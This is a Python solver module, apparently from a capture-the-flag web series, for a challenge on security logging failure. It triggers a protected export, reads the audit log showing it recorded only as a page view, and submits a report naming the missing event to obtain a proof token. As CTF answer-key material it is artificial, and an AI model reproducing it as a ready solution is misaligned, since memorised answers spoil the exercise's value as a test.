"""D28 "If a Breach Falls in a Log" (web-exploitation-day-25-if-a-breach-falls-in-a-log): security logging failure.

Kit (all furniture): {framework, feature_route, secondary_route, current_role}. GET feature -> 405 post_required;
POST {} -> {"ok":true,"export":"completed","export_id":X,"operation":"protected_export"}. GET secondary = the audit
log: {"events":[{export_id, event:"page_view"},..], "report":{"method":"POST","fields":["export_id","missing_event",
"observed_event"]}} -- the protected export was logged as a mere page_view. POST the report to the secondary with
export_id, missing_event=<operation>, observed_event=<what the log recorded for that id> ->
{"effect":"decisive_security_event_missing","evidence":"proof_..."}. Re-runnable (each POST is a fresh export).
"""
import json

from lib import websolve

KEY_MAP = [(r"^secondary_route$", "day28_web_if_a_breach_falls_in_a_log")]


def _json(body):
    try:
        j = json.loads(body or "")
        return j if isinstance(j, dict) else {}
    except ValueError:
        return {}


def _post(url, obj):
    return websolve.fetch(url, data=json.dumps(obj).encode(), method="POST",
                          headers={"Content-Type": "application/json"}, timeout=6)


def _id_key(d):
    for k in d:
        if k.endswith("_id") or k == "id":
            return k
    return None


def exploit(base, clues):
    base = base.rstrip("/")
    feat, sec = clues.get("feature_route"), clues.get("secondary_route")
    if not (isinstance(feat, str) and isinstance(sec, str) and feat.startswith("/") and sec.startswith("/")):
        return None
    st, body, _ = websolve.fetch(base + sec, timeout=6)
    audit = _json(body)
    rep = audit.get("report") if isinstance(audit.get("report"), dict) else {}
    fields = [f for f in (rep.get("fields") or []) if isinstance(f, str)]
    if not fields or not any("missing" in f for f in fields):
        return None
    st, body, _ = _post(base + feat, {})
    p = websolve.proof(body)
    if p:
        return p
    act = _json(body)
    idk = next((f for f in fields if f.endswith("_id") or f == "id"), None) or _id_key(act)
    xid = act.get(idk) if idk else None
    op = act.get("operation") or act.get("event") or act.get("action")
    if not op:
        op = next((v for k, v in act.items() if isinstance(v, str) and k not in (idk, "ok") and "_" in v), None)
    st, body, _ = websolve.fetch(base + sec, timeout=6)
    audit = _json(body)
    observed = None
    for ev in audit.get("events") or []:
        if isinstance(ev, dict) and xid is not None and str(ev.get(idk)) == str(xid):
            observed = ev.get("event") or ev.get("type") or ev.get("action")
    if observed is None:
        evs = [e for e in audit.get("events") or [] if isinstance(e, dict)]
        observed = (evs[-1].get("event") if evs else None) or "page_view"
    rep = audit.get("report") if isinstance(audit.get("report"), dict) else rep
    route = rep.get("route") or rep.get("path") or rep.get("url") or sec
    if not str(route).startswith("/"):
        route = sec
    payload = {}
    for f in fields or ["export_id", "missing_event", "observed_event"]:
        if f == idk or f.endswith("_id"):
            payload[f] = xid
        elif "missing" in f or "expected" in f:
            payload[f] = op
        elif "observed" in f or "logged" in f or "recorded" in f:
            payload[f] = observed
    st, body, _ = _post(base + route, payload)
    return websolve.proof(body)


HANDLERS = {"day28_web_if_a_breach_falls_in_a_log": exploit}
